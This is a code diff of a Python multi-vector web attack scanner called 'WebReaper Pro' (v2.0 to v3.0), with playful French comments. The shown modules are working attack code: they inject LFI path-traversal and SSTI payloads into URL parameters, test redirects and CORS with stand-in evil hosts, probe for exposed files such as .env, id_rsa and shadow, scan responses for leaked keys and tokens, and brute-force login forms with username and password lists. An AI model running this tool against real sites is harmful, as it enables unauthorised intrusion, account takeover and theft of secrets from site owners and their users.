-    # *traverser les répertoires comme des couloirs interdits*
-    params = parse_url_params(url)
-    file_params = [p for p in params if any(k in p.lower()
-        for k in ("file", "page", "path", "include", "load", "template", "view", "doc"))]
+def lfi_url(url):
+    # *traverser les dossiers comme des couloirs interdits*
+    params = get_params(url)
+    if not params:
+        return
 
+    # prioritize suspicious param names
+    file_params = [p for p in params if any(k in p.lower()
+        for k in ("file", "page", "path", "include", "load", "template",
+                  "view", "doc", "dir", "folder", "cat", "module", "show",
+                  "content", "section", "lang", "locale", "read", "open"))]
     targets = file_params if file_params else list(params.keys())
 
     for param in targets:
         for payload in LFI_PAYLOADS:
-            injected = inject_param(url, param, payload)
-            body, _, _, _, _ = fetch(injected)
+            test_url = inject_url(url, param, payload)
+            body, _, _, _, _ = fetch(test_url, timeout=8)
             if body is None:
                 continue
-            for indicator in LFI_INDICATORS:
-                if re.search(indicator, body, re.IGNORECASE):
+            for ind in LFI_INDICATORS:
+                if re.search(ind, body):
                     log("CRITICAL",
-                        f"LFI (Path Traversal) → {urllib.parse.urlparse(url).path}",
-                        f"param={param} | payload={payload!r}")
+                        f"LFI Path Traversal → {urllib.parse.urlparse(url).path}",
+                        f"param={param!r} payload={payload!r}")
                     return
 
 # ══════════════════════════════════════════════════
-# MODULE 6 — OPEN REDIRECT
+# MODULE — SSTI
 # ══════════════════════════════════════════════════
 
-def test_open_redirect(url):
-    # *convaincre le site de nous envoyer ailleurs*
-    params = parse_url_params(url)
-    redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
+def ssti_url(url):
+    # *{{7*7}} — si le site répond 49 t'as du RCE*
+    params = get_params(url)
+    if not params:
+        return
 
-    for param in redirect_params:
-        evil = "https://evil-canary-check.com"
-        injected = inject_param(url, param, evil)
-        body, _, _, _, real_url = fetch(injected, allow_redirect=False)
-        if real_url and "evil-canary-check" in real_url:
-            log("HIGH",
-                f"Open Redirect → {urllib.parse.urlparse(url).path}",
-                f"param={param} | redirects to external domain")
+    for param in params:
+        for payload in SSTI_PAYLOADS:
+            test_url = inject_url(url, param, payload)
+            body, _, _, _, _ = fetch(test_url, timeout=8)
+            if body and "49" in body and "{{7*7}}" not in body:
+                log("CRITICAL",
+                    f"SSTI (Server-Side Template Injection) → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r} payload={payload!r} response contains '49'")
+                return
+            if body and payload in body:
+                log("MEDIUM",
+                    f"SSTI Potential (payload reflected) → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r}")
 
 # ══════════════════════════════════════════════════
-# MODULE 7 — SENSITIVE FILES
+# MODULE — OPEN REDIRECT
 # ══════════════════════════════════════════════════
 
-def test_sensitive_files(base_url):
-    # *frapper à toutes les portes jusqu'à trouver une ouverte*
-    parsed = urllib.parse.urlparse(base_url)
-    origin = f"{parsed.scheme}://{parsed.netloc}"
+def open_redirect_url(url):
+    # *convaincre le serveur de nous envoyer ailleurs*
+    params = get_params(url)
+    rparams = [p for p in params if p.lower() in REDIRECT_PARAMS]
+    if not rparams:
+        return
 
-    found = []
+    evil = "https://evil.example-canary.com"
+    for param in rparams:
+        for val in [evil, f"//{evil[8:]}", f"/{evil}"]:
+            test_url = inject_url(url, param, val)
+            _, headers, status, _, real_url = fetch(test_url, allow_redirect=False, timeout=8)
+            loc = headers.get("location", "")
+            if "evil.example-canary" in loc or "evil.example-canary" in (real_url or ""):
+                log("HIGH",
+                    f"Open Redirect → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r} redirects to {loc}")
+                return
+
+# ══════════════════════════════════════════════════
+# MODULE — SENSITIVE FILES
+# ══════════════════════════════════════════════════
+
+def check_sensitive_files():
+    # *frapper à chaque porte jusqu'à en trouver une ouverte*
     lock  = threading.Lock()
-
-    def check_file(path):
-        url  = origin + path
-        body, headers, status, _, _ = fetch(url)
-        if status == 200 and body:
-            severity = "CRITICAL" if any(x in path for x in [".env", ".git", "config", "passwd", "sql"]) else "MEDIUM"
-            with lock:
-                found.append((severity, path, len(body)))
-                log(severity,
-                    f"Sensitive File Exposed → {path}",
-                    f"status=200 | size={len(body)} bytes")
-
-    threads = []
+    queue = Queue()
     for path in SENSITIVE_FILES:
-        t = threading.Thread(target=check_file, args=(path,))
-        t.start()
-        threads.append(t)
-        if len(threads) >= THREADS:
-            for t in threads:
-                t.join()
-            threads = []
-    for t in threads:
-        t.join()
+        queue.put(path)
+
+    def worker():
+        while not queue.empty():
+            try:
+                path = queue.get_nowait()
+            except Empty:
+                return
+            url  = ORIGIN + path
+            body, headers, status, _, _ = fetch(url, timeout=6)
+            if status == 200 and body and len(body) > 10:
+                sev = "CRITICAL" if any(x in path for x in
+                      (".env", ".git", "config", "passwd", ".sql", ".htpasswd",
+                       "id_rsa", "shadow", "wp-config")) else \
+                      "HIGH" if any(x in path for x in
+                      ("admin", "phpinfo", "phpMyAdmin", "pma", "actuator",
+                       "swagger", "openapi")) else "MEDIUM"
+                with lock:
+                    log(sev,
+                        f"Sensitive File Exposed → {path}",
+                        f"HTTP {status} | {len(body)} bytes")
+            queue.task_done()
+
+    workers = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
+    for w in workers:
+        w.start()
+    queue.join()
 
 # ══════════════════════════════════════════════════
-# MODULE 8 — SECURITY HEADERS
+# MODULE — SECURITY HEADERS + FINGERPRINT
 # ══════════════════════════════════════════════════
 
-def test_headers(url):
-    # *lire les en-têtes comme lire une biographie de négligence*
-    _, headers, _, _, _ = fetch(url)
+def check_headers():
+    # *les headers trahissent leur maître*
+    body, headers, status, _, _ = fetch(TARGET, timeout=8)
     if not headers:
         return
 
-    for header in SECURITY_HEADERS:
-        if not any(h.lower() == header.lower() for h in headers):
-            log("LOW",
-                f"Missing Security Header → {header}",
-                f"url={url}")
+    for header, reason in SECURITY_HEADERS.items():
+        if header.lower() not in headers:
+            log("LOW", f"Missing Header → {header}", reason)
 
-    server = headers.get("Server", "")
+    server = headers.get("server", "")
     if server:
-        log("INFO",
-            f"Server Banner Disclosed → {server}",
-            f"consider hiding this")
+        log("INFO", f"Server Disclosed → {server}", "fingerprinting risk")
 
-    powered = headers.get("X-Powered-By", "")
+    powered = headers.get("x-powered-by", "")
     if powered:
-        log("MEDIUM",
-            f"Technology Disclosed → X-Powered-By: {powered}",
-            f"reveals backend technology stack")
+        log("MEDIUM", f"Tech Stack Disclosed → X-Powered-By: {powered}",
+            "reveals backend technology")
 
-    # Cookie analysis
-    for k, v in headers.items():
-        if k.lower() == "set-cookie":
-            if "httponly" not in v.lower():
-                log("MEDIUM", f"Cookie missing HttpOnly flag", f"cookie={v[:60]}")
-            if "secure" not in v.lower():
-                log("LOW", f"Cookie missing Secure flag", f"cookie={v[:60]}")
-            if "samesite" not in v.lower():
-                log("LOW", f"Cookie missing SameSite flag", f"cookie={v[:60]}")
+    aspnet = headers.get("x-aspnet-version", "")
+    if aspnet:
+        log("MEDIUM", f"ASP.NET Version Disclosed → {aspnet}")
+
+    for hname, hval in headers.items():
+        if hname == "set-cookie":
+            flags = hval.lower()
+            if "httponly" not in flags:
+                log("MEDIUM", "Cookie missing HttpOnly", f"{hval[:60]}")
+            if "secure" not in flags:
+                log("LOW",    "Cookie missing Secure flag", f"{hval[:60]}")
+            if "samesite" not in flags:
+                log("LOW",    "Cookie missing SameSite", f"{hval[:60]}")
 
 # ══════════════════════════════════════════════════
-# MODULE 9 — CORS MISCONFIGURATION
+# MODULE — CORS
 # ══════════════════════════════════════════════════
 
-def test_cors(url):
+def check_cors():
     # *le serveur va-t-il laisser n'importe qui le toucher ?*
-    evil_origin = "https://evil-attacker.com"
-    _, headers, _, _, _ = fetch(url, extra_headers={"Origin": evil_origin})
+    evil = "https://evil-attacker.pwned.com"
+    _, headers, _, _, _ = fetch(TARGET, extra_headers={"Origin": evil}, timeout=8)
     if not headers:
         return
 
-    acao = headers.get("Access-Control-Allow-Origin", "")
-    acac = headers.get("Access-Control-Allow-Credentials", "")
+    acao = headers.get("access-control-allow-origin", "")
+    acac = headers.get("access-control-allow-credentials", "")
 
     if acao == "*":
-        log("MEDIUM",
-            f"CORS Wildcard → Access-Control-Allow-Origin: *",
-            f"any domain can read responses")
-    elif acao == evil_origin:
+        log("MEDIUM", "CORS Wildcard → Access-Control-Allow-Origin: *",
+            "any domain can read unauthenticated responses")
+    elif acao == evil:
         if acac.lower() == "true":
-            log("CRITICAL",
-                f"CORS Misconfiguration (with credentials) → reflects evil origin",
-                f"authenticated requests from attacker domain allowed!")
+            log("CRITICAL", "CORS + Credentials → reflects evil origin with credentials!",
+                f"authenticated cross-origin reads possible from {evil}")
         else:
-            log("HIGH",
-                f"CORS Misconfiguration → reflects arbitrary origin",
-                f"origin={evil_origin}")
+            log("HIGH", "CORS Misconfiguration → arbitrary origin reflected",
+                f"ACAO: {acao}")
 
 # ══════════════════════════════════════════════════
-# MODULE 10 — BRUTE FORCE LOGIN
+# MODULE — INFO LEAK
 # ══════════════════════════════════════════════════
 
-def test_brute_force(forms, base_url):
-    # *frapper encore et encore jusqu'à ce que la porte cède*
-    if not BRUTE_MODE:
-        log("INFO", "Brute force skipped (use --brute to enable)")
-        return
-
-    login_forms = []
-    for form in forms:
-        inputs = [i for i in form["inputs"] if i["type"] in ("text", "email", "password")]
-        has_password = any(i["type"] == "password" for i in form["inputs"])
-        if has_password:
-            login_forms.append(form)
-
-    if not login_forms:
-        log("INFO", "No login forms detected for brute force")
-        return
-
-    for form in login_forms:
-        log("SCAN", f"Brute forcing form → {form['action']}")
-        user_fields = [i for i in form["inputs"] if i["type"] in ("text", "email")]
-        pass_fields = [i for i in form["inputs"] if i["type"] == "password"]
-
-        if not user_fields or not pass_fields:
-            continue
-
-        original_body, _, original_status, _, _ = fetch(form["action"])
-
-        for user in ["admin", "administrator", "root", "user"]:
-            for password in BRUTEFORCE_WORDLIST:
-                data = {}
-                for inp in form["inputs"]:
-                    if inp["name"] == user_fields[0]["name"]:
-                        data[inp["name"]] = user
-                    elif inp["name"] == pass_fields[0]["name"]:
-                        data[inp["name"]] = password
-                    else:
-                        data[inp["name"]] = inp["value"]
-
-                body, _, status, _, real_url = fetch(form["action"], data=data, method=form["method"])
-                if body is None:
-                    continue
-
-                fail_indicators = ["invalid", "incorrect", "wrong", "failed",
-                                   "error", "denied", "unauthorized"]
-                is_fail = any(ind in (body or "").lower() for ind in fail_indicators)
-
-                if not is_fail and status in (200, 302):
-                    if real_url and real_url != form["action"]:
-                        log("CRITICAL",
-                            f"Login Brute Force SUCCESS → {form['action']}",
-                            f"user={user!r} | pass={password!r} | redirect={real_url}")
-                        return
-                    elif body and original_body and len(body) != len(original_body):
-                        log("HIGH",
-                            f"Possible Login Success → {form['action']}",
-                            f"user={user!r} | pass={password!r} | response differs")
-                        return
-
-# ══════════════════════════════════════════════════
-# MODULE 11 — INFO LEAK DETECTION
-# ══════════════════════════════════════════════════
-
-def test_info_leak(url):
-    # *les erreurs bavardent plus que les développeurs*
-    body, _, _, _, _ = fetch(url)
+def check_info_leak(url):
+    # *le code bavard trahit ses secrets dans les réponses d'erreur*
+    body, _, _, _, _ = fetch(url, timeout=8)
     if not body:
         return
 
     patterns = {
-        "Stack Trace":      r"(at\s+[\w\.]+\([\w\.]+:\d+\))",
-        "PHP Error":        r"(Parse error|Fatal error|Warning|Notice).*on line \d+",
-        "Debug Info":       r"(var_dump|print_r|debug_backtrace)\s*\(",
-        "SQL Query Leaked": r"(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[\w\s,`'\*]+",
-        "Email Address":    r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
-        "IP Address":       r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
-        "AWS Key":          r"AKIA[0-9A-Z]{16}",
-        "Private Key":      r"-----BEGIN (RSA|EC|PRIVATE) KEY-----",
-        "JWT Token":        r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+",
+        "Stack Trace (Java)": r"at\s+[\w\.$]+\([\w]+\.java:\d+\)",
+        "Stack Trace (.NET)": r"at\s+[\w\.\s]+\([\w\s,]*\)\s+in\s+\w",
+        "PHP Error":          r"(Parse error|Fatal error|Warning|Notice).*?on line \d+",
+        "Python Traceback":   r"Traceback \(most recent call last\)",
+        "Debug Mode":         r"(var_dump|print_r|debug_backtrace|dd\(|dump\()\s*\(",
+        "SQL Query Leaked":   r"(SELECT\s+[\w\*,\s]+FROM|INSERT\s+INTO|UPDATE\s+\w+\s+SET)",
+        "AWS Access Key":     r"AKIA[0-9A-Z]{16}",
+        "AWS Secret Key":     r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
+        "Private Key":        r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
+        "JWT Token":          r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+",
+        "Basic Auth Creds":   r"(?i)(password|passwd|pwd|secret|token)\s*[=:]\s*['\"]?[\w@#$!%]{6,}",
+        "Internal IP":        r"\b(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)\b",
+        "Email Address":      r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,6}",
     }
 
-    for label, pattern in patterns.items():
-        match = re.search(pattern, body)
-        if match:
-            severity = "CRITICAL" if label in ("AWS Key", "Private Key") else \
-                       "HIGH"     if label in ("Stack Trace", "SQL Query Leaked", "JWT Token") else \
-                       "MEDIUM"
-            log(severity,
-                f"Info Leak → {label}",
-                f"match={match.group(0)[:80]!r}")
+    for label, pat in patterns.items():
+        m = re.search(pat, body)
+        if m:
+            sev = "CRITICAL" if label in ("AWS Access Key", "AWS Secret Key", "Private Key") else \
+                  "HIGH"     if label in ("Stack Trace (Java)", "Stack Trace (.NET)",
+                                          "SQL Query Leaked", "JWT Token", "Python Traceback") else \
+                  "MEDIUM"
+            log(sev, f"Info Leak → {label}",
+                f"match: {m.group(0)[:100]!r}")
 
 # ══════════════════════════════════════════════════
-# RAPPORT FINAL
+# MODULE — BRUTE FORCE
 # ══════════════════════════════════════════════════
 
-def print_report(target, start_time):
+def brute_force_login(forms):
+    # *l'hydre essaie chaque combinaison jusqu'à trouver la faille*
+    if not BRUTE_MODE:
+        log("INFO", "Brute force disabled (add --brute to enable)")
+        return
+
+    login_forms = [f for f in forms if any(i["type"] == "password" for i in f["inputs"])]
+    if not login_forms:
+        log("INFO", "No login forms found")
+        return
+
+    for form in login_forms:
+        user_inputs = [i for i in form["inputs"] if i["type"] in ("text", "email")]
+        pass_inputs = [i for i in form["inputs"] if i["type"] == "password"]
+        if not user_inputs or not pass_inputs:
+            continue
+
+        log("SCAN", f"Brute force → {form['action']}")
+        baseline, _, baseline_status, _, _ = fetch(form["action"], timeout=8)
+
+        for user in BRUTEFORCE_USERS:
+            for pwd in BRUTEFORCE_PASSWORDS:
+                data = {i["name"]: i["value"] for i in form["inputs"]}
+                data[user_inputs[0]["name"]] = user
+                data[pass_inputs[0]["name"]] = pwd
+
+                body, _, status, _, real_url = fetch(
+                    form["action"], data=data, method=form["method"], timeout=8)
+                if body is None:
+                    continue
+
+                fail_words = {"invalid", "incorrect", "wrong", "failed",
+                              "error", "denied", "unauthorized", "bad credentials"}
+                is_fail = any(w in body.lower() for w in fail_words)
+
+                if not is_fail:
+                    if status in (301, 302) and real_url != form["action"]:
+                        log("CRITICAL",
+                            f"Login SUCCESS → {form['action']}",
+                            f"user={user!r} pass={pwd!r} redirect→{real_url}")
+                        return
+                    elif baseline and abs(len(body) - len(baseline)) > 50:
+                        log("HIGH",
+                            f"Possible Login → {form['action']}",
+                            f"user={user!r} pass={pwd!r} response size differs")
+                        return
+
+# ══════════════════════════════════════════════════
+# REPORT
+# ══════════════════════════════════════════════════
+
+def print_report(start_time, n_urls, n_forms):
     elapsed = time.time() - start_time
-    print(f"\n{'═'*65}")
-    print(f"{BD}{W}  WebReaper Pro — SCAN REPORT{RS}")
-    print(f"{'═'*65}")
-    print(f"  {C}Target  {RS}: {target}")
-    print(f"  {C}Duration{RS}: {elapsed:.1f}s")
-    print(f"  {C}Date    {RS}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print(f"{'─'*65}")
-    print(f"  {R}CRITICAL{RS}: {VULN_COUNT['CRITICAL']}")
-    print(f"  {R}HIGH    {RS}: {VULN_COUNT['HIGH']}")
-    print(f"  {Y}MEDIUM  {RS}: {VULN_COUNT['MEDIUM']}")
-    print(f"  {B}LOW     {RS}: {VULN_COUNT['LOW']}")
-    print(f"  {C}INFO    {RS}: {VULN_COUNT['INFO']}")
+    print(f"\n{'═'*68}")
+    print(f"{BD}{W}   WebReaper Pro v3.0 — FINAL REPORT{RS}")
+    print(f"{'═'*68}")
+    print(f"  {C}Target   {RS}: {TARGET}")
+    print(f"  {C}URLs     {RS}: {n_urls} crawled | {n_forms} forms found")
+    print(f"  {C}Duration {RS}: {elapsed:.1f}s")
+    print(f"  {C}Date     {RS}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"{'─'*68}")
+    print(f"  {R}{BD}CRITICAL {RS}: {VULN_COUNT['CRITICAL']}")
+    print(f"  {R}HIGH     {RS}: {VULN_COUNT['HIGH']}")
+    print(f"  {Y}MEDIUM   {RS}: {VULN_COUNT['MEDIUM']}")
+    print(f"  {B}LOW      {RS}: {VULN_COUNT['LOW']}")
+    print(f"  {C}INFO     {RS}: {VULN_COUNT['INFO']}")
+    print(f"{'─'*68}")
     total = sum(VULN_COUNT.values())
-    print(f"{'─'*65}")
-    print(f"  Total findings: {BD}{total}{RS}")
-    print(f"{'═'*65}\n")
+    risk  = "CRITICAL" if VULN_COUNT["CRITICAL"] > 0 else \
+            "HIGH"     if VULN_COUNT["HIGH"] > 0 else \
+            "MEDIUM"   if VULN_COUNT["MEDIUM"] > 0 else "LOW"
+    rcolor = R if risk in ("CRITICAL", "HIGH") else Y if risk == "MEDIUM" else B
+    print(f"  Total: {BD}{total}{RS} findings | Risk: {rcolor}{BD}{risk}{RS}")
+    print(f"{'═'*68}\n")
 
     if REPORT_MODE:
-        fname = f"webreaper_{urllib.parse.urlparse(target).netloc}_{int(time.time())}.json"
+        fname = (f"webreaper_{urllib.parse.urlparse(TARGET).netloc}"
+                 f"_{int(time.time())}.json")
         with open(fname, "w") as f:
             json.dump({
-                "target": target,
-                "scan_date": datetime.now().isoformat(),
+                "target":       TARGET,
+                "scan_date":    datetime.now().isoformat(),
                 "duration_sec": round(elapsed, 2),
-                "summary": VULN_COUNT,
-                "findings": RESULTS,
+                "urls_crawled": n_urls,
+                "forms_found":  n_forms,
+                "summary":      VULN_COUNT,
+                "findings":     RESULTS,
             }, f, indent=2)
         print(f"  {G}Report saved → {fname}{RS}\n")
 
 # ══════════════════════════════════════════════════
-# MAIN — ORCHESTRATEUR
+# BANNER
 # ══════════════════════════════════════════════════
 
 def banner():
-    print(f"""
-{R}{BD}
+    print(f"""{R}{BD}
  ██╗    ██╗███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
  ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██║ █╗ ██║█████╗  ██████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ╚███╔███╔╝███████╗██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
   ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
-{RS}{Y}                    Pro v2.0 — Multi-vector Web Vuln Scanner{RS}
-{C}         SQLi | XSS | CMDi | LFI | Redirect | CORS | Headers | Brute{RS}
+{RS}{Y}              Pro v3.0 — Multi-vector Web Vulnerability Scanner{RS}
+{C}    SQLi | XSS | CMDi | LFI | SSTI | Redirect | CORS | Headers | Brute{RS}
 """)
+
+# ══════════════════════════════════════════════════
+# MAIN
+# ══════════════════════════════════════════════════
 
 def main():
     banner()
-    start = time.time()
+    t0 = time.time()
 
-    log("SCAN", f"Target → {TARGET}")
-    log("SCAN", f"Mode   → {'DEEP' if DEEP_MODE else 'NORMAL'} | Brute={'ON' if BRUTE_MODE else 'OFF'}")
+    log("SCAN", f"Target  → {TARGET}")
+    log("SCAN", f"Threads → {THREADS} | Deep={DEEP_MODE} | Brute={BRUTE_MODE}")
 
-    # ── CRAWL ─────────────────────────────────────
-    log("SCAN", "Crawling site...")
-    all_urls  = {TARGET}
-    all_forms = []
-    queue     = [TARGET]
+    # ── phase 1 : headers, cors, infos ────────────
+    log("SCAN", "Checking headers, CORS, info leak...")
+    check_headers()
+    check_cors()
+    check_info_leak(TARGET)
 
-    for depth in range(MAX_DEPTH + 1):
-        new_links = set()
-        for url in list(queue):
-            with LOCK:
-                if url in VISITED:
-                    continue
-                VISITED.add(url)
-            links, forms = crawl(url, depth)
-            new_links |= links
-            all_forms.extend(forms)
-        queue = list(new_links - all_urls)
-        all_urls |= new_links
+    # ── phase 2 : sensitive files ─────────────────
+    log("SCAN", "Probing sensitive files...")
+    check_sensitive_files()
 
-    log("INFO", f"Crawled {len(all_urls)} URLs, found {len(all_forms)} forms")
+    # ── phase 3 : crawl ───────────────────────────
+    log("SCAN", "Crawling...")
+    all_urls, all_forms = crawl_site(TARGET)
+    # deduplicate forms by action+method
+    seen_forms = set()
+    unique_forms = []
+    for f in all_forms:
+        key = (f["action"], f["method"], tuple(i["name"] for i in f["inputs"]))
+        if key not in seen_forms:
+            seen_forms.add(key)
+            unique_forms.append(f)
+    all_forms = unique_forms
 
-    # ── HEADER & CORS ──────────────────────────────
-    log("SCAN", "Testing headers & CORS...")
-    test_headers(TARGET)
-    test_cors(TARGET)
+    log("INFO", f"Crawled {len(all_urls)} URLs | Found {len(all_forms)} unique forms")
 
-    # ── SENSITIVE FILES ────────────────────────────
-    log("SCAN", "Testing sensitive file exposure...")
-    test_sensitive_files(TARGET)
+    # parametric URLs
+    param_urls = [u for u in all_urls if "?" in u]
+    log("SCAN", f"Testing {len(param_urls)} parametric URLs...")
 
-    # ── INFO LEAK on homepage ──────────────────────
-    log("SCAN", "Testing info leakage...")
-    test_info_leak(TARGET)
-
-    # ── VULN TESTS per URL ─────────────────────────
-    parametric_urls = [u for u in all_urls if "?" in u]
-    log("SCAN", f"Testing {len(parametric_urls)} parametric URLs for injections...")
+    # ── phase 4 : injection tests ─────────────────
+    inj_queue = Queue()
+    for u in param_urls:
+        inj_queue.put(u)
 
     def scan_url(url):
-        test_sqli_url(url)
-        test_xss_url(url)
-        test_cmdi_url(url)
-        test_lfi_url(url)
-        test_open_redirect(url)
+        sqli_url(url)
+        xss_url(url)
+        cmdi_url(url)
+        lfi_url(url)
+        ssti_url(url)
+        open_redirect_url(url)
 
-    url_threads = []
-    for url in parametric_urls:
-        t = threading.Thread(target=scan_url, args=(url,))
-        t.start()
-        url_threads.append(t)
-        if len(url_threads) >= THREADS:
-            for t in url_threads:
-                t.join()
-            url_threads = []
-    for t in url_threads:
-        t.join()
+    def url_worker():
+        while not inj_queue.empty():
+            try:
+                url = inj_queue.get_nowait()
+                scan_url(url)
+            except Empty:
+                return
 
-    # ── VULN TESTS per FORM ────────────────────────
+    url_workers = [threading.Thread(target=url_worker, daemon=True) for _ in range(THREADS)]
+    for w in url_workers:
+        w.start()
+    for w in url_workers:
+        w.join()
+
+    # ── phase 5 : form tests ───────────────────────
     log("SCAN", f"Testing {len(all_forms)} forms...")
     for form in all_forms:
-        test_sqli_form(form)
-        test_xss_form(form)
+        sqli_form(form)
+        xss_form(form)
 
-    # ── BRUTE FORCE ────────────────────────────────
-    test_brute_force(all_forms, TARGET)
+    # ── phase 6 : brute force ──────────────────────
+    brute_force_login(all_forms)
 
-    # ── RAPPORT ────────────────────────────────────
-    print_report(TARGET, start)
+    # ── report ─────────────────────────────────────
+    print_report(t0, len(all_urls), len(all_forms))
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print(f"Usage: python webreaper.py <url> [--deep] [--brute] [--report]")
-        print(f"  --deep    : crawl le site entier (plus lent)")
-        print(f"  --brute   : active le brute force login")
-        print(f"  --report  : sauvegarde un rapport JSON")
+        print(f"Usage: python webreaper.py <url> [options]")
+        print(f"  --deep          crawl entire site (slower, more thorough)")
+        print(f"  --brute         enable login brute force")
+        print(f"  --report        save JSON report")
+        print(f"  --threads N     number of threads (default: 20)")
+        print(f"\nExample: python webreaper.py http://testphp.vulnweb.com --deep --report")
         sys.exit(1)
     main()
